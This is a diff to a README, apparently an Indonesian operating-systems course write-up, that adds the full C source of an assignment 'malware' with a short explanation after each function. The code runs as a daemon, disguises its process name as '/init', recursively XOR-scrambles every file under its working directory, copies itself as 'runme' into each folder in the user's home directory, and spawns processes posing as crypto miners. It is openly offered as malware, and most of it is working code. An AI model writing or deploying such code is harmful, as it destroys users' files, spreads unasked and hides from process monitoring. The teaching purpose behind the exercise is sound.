@@ -1084,4 +1084,224 @@ Jika jumlah argumen tidak sesuai, menampilkan cara penggunaan
 
 #soal_3
 
+Pada soal ini kami disuruh membuat malware yang dapat menginfeksi perangkat korban dengan mengganti namanya, membuat enkriptor file dengan metode rekursif, menyebarkan malware ke mesin korban, dan membuat fork bomb & miner.
+
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+          #include <dirent.h>
+          #include <sys/wait.h>
+          #include <time.h>
+          #include <signal.h>
+          #include <sys/prctl.h>
+          #include <sys/stat.h>
+          #include <errno.h>
+          
+          char *g_argv0;
+
+Mengambil fungsi untuk file, direktori, proses, waktu, sinyal, dan lain-lain serta memasukkan variabel global untuk menyimpan nama program yang nantinya akan dipalai untuk mengubah nama proses.
+
+          void write_log(const char *message) {
+              FILE *log = fopen("activity.log", "a");
+              if (!log) return;
+              time_t now = time(NULL);
+              struct tm *t = localtime(&now);
+              fprintf(log, "[%02d-%02d-%d][%02d:%02d:%02d] - %s\n",
+                      t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
+                      t->tm_hour, t->tm_min, t->tm_sec, message);
+              fclose(log);
+          }
+
+Membuat activity.log dengan format tulisan Tanggal, Jam-Menit-Detik, dan Pesan.
+
+          void set_process_name(const char *new_name) {
+              prctl(PR_SET_NAME, new_name, 0, 0, 0);
+              if(g_argv0) {
+                  memset(g_argv0, 0, strlen(g_argv0));
+                  strncpy(g_argv0, new_name, strlen(new_name));
+              }
+          }
+
+MMengubah nama yang ditampil di daftar proses.
+
+          void daemonize() {
+              pid_t pid = fork();
+              if(pid < 0) exit(EXIT_FAILURE);
+              if(pid > 0) exit(EXIT_SUCCESS);
+              if(setsid() < 0) exit(EXIT_FAILURE);
+              umask(0);
+          }
+
+Membuat fork yang memecah menjadi dua proses dimana proses parent akan segera keluar sedangkan proses child akan lanjut sebagai daemon. 
+
+          void signal_handler(int sig) {
+              kill(0, SIGTERM);
+              exit(0);
+          }
+
+Ketika menerima SIGTERM atau SIGINT maka ia akan mengirimnya ke semua proses anak.
+
+          void encrypt_file(const char *filepath, int key) {
+              if(strstr(filepath, "runme") != NULL || strstr(filepath, "malware.c") != NULL || strstr(filepath, "activity.log") != NULL)
+                  return;
+              FILE *fp = fopen(filepath, "rb+");
+              if(!fp) return;
+              if(fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return; }
+              long fsize = ftell(fp);
+              if(fsize < 0) { fclose(fp); return; }
+              rewind(fp);
+              char *buffer = malloc(fsize);
+              if(!buffer) { fclose(fp); return; }
+              size_t bytesRead = fread(buffer, 1, fsize, fp);
+              if(bytesRead != fsize) { free(buffer); fclose(fp); return; }
+              rewind(fp);
+              for(long i = 0; i < fsize; i++) buffer[i] ^= key;
+              fwrite(buffer, 1, fsize, fp);
+              free(buffer);
+              fclose(fp);
+              char log_msg[256];
+              snprintf(log_msg, sizeof(log_msg), "Encrypted %s with key %d", filepath, key);
+              write_log(log_msg);
+          }
+
+Proses ini membuka file lalu setiap byte akan di-XOR dengan key yang dimana akan mengenkripsi isi file tersebut. Proses juga akan mencatat di log bahwa file diacak dengan kunci berapa. File-file penting seperti kode sendiri, log sendiri, serta runme akan dilewati dan tidak terdampak.
+
+          void scan_and_encrypt(const char *dir_path, int key) {
+              DIR *dir = opendir(dir_path);
+              if(!dir) return;
+              struct dirent *entry;
+              while((entry = readdir(dir)) != NULL) {
+                  if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+                     continue;
+                  char full_path[1024];
+                  snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);
+                  struct stat s;
+                  if(stat(full_path, &s) == -1) continue;
+                  if(S_ISDIR(s.st_mode))
+                      scan_and_encrypt(full_path, key);
+                  else if(S_ISREG(s.st_mode))
+                      encrypt_file(full_path, key);
+              }
+              closedir(dir);
+          }
+
+Fungsi ini akan membuka folder lalu membaca semua isinya termasuk isi dari subfolder-subfolder yang ada secara rekursif. Jika menemukan file biasa, maka akan dikirim ke fungsi encrypt_file sebelumnya.
+
+          void copy_file(const char *src, const char *dest_dir) {
+              char dest_path[512];
+              snprintf(dest_path, sizeof(dest_path), "%s/runme", dest_dir);
+              pid_t pid = fork();
+              if(pid == 0) {
+                  char *args[] = {"/bin/cp", (char *)src, dest_path, NULL};
+                  execve("/bin/cp", args, NULL);
+                  exit(EXIT_FAILURE);
+              } else if(pid > 0) wait(NULL);
+          }
+
+Fungsi ini menyalin diri sendiri ke folder yang ditujukan sehingga file runme akan disalinkan.
+
+          void spread_trojan(const char *binary_path, const char *home_dir) {
+              DIR *dir = opendir(home_dir);
+              if(!dir) return;
+              char real_cwd[1024];
+              getcwd(real_cwd, sizeof(real_cwd));
+              struct dirent *entry;
+              while((entry = readdir(dir)) != NULL) {
+                  if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+                     continue;
+                  if(entry->d_type == DT_DIR) {
+                      char subdir[512];
+                      snprintf(subdir, sizeof(subdir), "%s/%s", home_dir, entry->d_name);
+                      if(strcmp(subdir, real_cwd) == 0) continue;
+                      copy_file(binary_path, subdir);
+                      char log_msg[1024];
+                      snprintf(log_msg, sizeof(log_msg), "Copied binary to %s", subdir);
+                      write_log(log_msg);
+                  }
+              }
+              closedir(dir);
+          }
+
+Membuka folder Home lalu untuk setiap subfolder akan disalinkan malwarenya. Fungsi juga mencata di log bahwa folder apa saja yang sudah disalinkan.
+
+          void generate_random_hash(char *hash, size_t len) {
+              const char hex_chars[] = "0123456789abcdef";
+              for(size_t i = 0; i < len; i++)
+                  hash[i] = hex_chars[rand() % 16];
+              hash[len] = '\0';
+          }
+
+Mengisi string dengan karakter heksadesimal acak, mirip “hash” dalam penambangan kripto.
+
+          void mine_crafter(int id) {
+              char procname[32];
+              snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
+              set_process_name(procname);
+              while(1) {
+                  int wait_time = rand() % 28 + 3;
+                  sleep(wait_time);
+                  char hash[65];
+                  generate_random_hash(hash, 64);
+                  time_t now = time(NULL);
+                  struct tm *t = localtime(&now);
+                  char time_str[64];
+                  snprintf(time_str, sizeof(time_str), "[%04d-%02d-%02d %02d:%02d:%02d]",
+                           t->tm_year+1900, t->tm_mon+1, t->tm_mday,
+                           t->tm_hour, t->tm_min, t->tm_sec);
+                  FILE *miner_log = fopen("/tmp/.miner.log", "a");
+                  if(miner_log) {
+                      fprintf(miner_log, "%s[%s] %s\n", time_str, procname, hash);
+                      fclose(miner_log);
+                  }
+              }
+          }
+
+Mengganti nama proses sendiri lalu untuk setiap beberapa detik akan membuat hash baru dan mencatatnya di /tmp/.miner.log. Fungsi ini berupa latihan miner kripto.
+
+          void create_fork_bomb() {
+              const int min_children = 3;
+              set_process_name("rodok.exe");
+              for(int i = 0; i < min_children; i++) {
+                  pid_t pid = fork();
+                  if(pid < 0) exit(EXIT_FAILURE);
+                  else if(pid == 0) {
+                      mine_crafter(i);
+                      exit(EXIT_SUCCESS);
+                  }
+              }
+              while(1) sleep(30);
+          }
+
+Membuat 3 proses anak yang menjalankan fungsi mine_crafter sebelumnya. Proses dilakukan setiap 30 detik.
+
+          int main(int argc, char *argv[]) {
+              if(argc != 2 || strcmp(argv[1], "run") != 0) {
+                  printf("Usage: %s run\n", argv[0]);
+                  exit(EXIT_FAILURE);
+              }
+              g_argv0 = argv[0];
+              daemonize();
+              srand(time(NULL));
+              signal(SIGTERM, signal_handler);
+              signal(SIGINT, signal_handler);
+              set_process_name("/init");
+              write_log("Malware started as /init");
+              int key = (int)time(NULL);
+              char cwd[1024];
+              if(getcwd(cwd, sizeof(cwd)) == NULL) exit(EXIT_FAILURE);
+              if(fork() == 0) {
+                  create_fork_bomb();
+                  exit(0);
+              }
+              while(1) {
+                  scan_and_encrypt(cwd, key);
+                  spread_trojan("./runme", getenv("HOME"));
+                  sleep(30);
+              }
+              return 0;
+          }
+
+Mengecek argumen sehingga proses bisa dieksekusi serta menjadikannya Daemon. Menyamarkan nama proses menjadi /init dan memulai fork bomb di proses anak. Untuk proses enkripsi dan penyebaran dilakukan setiap 30 detik. 
+
 #soal_4
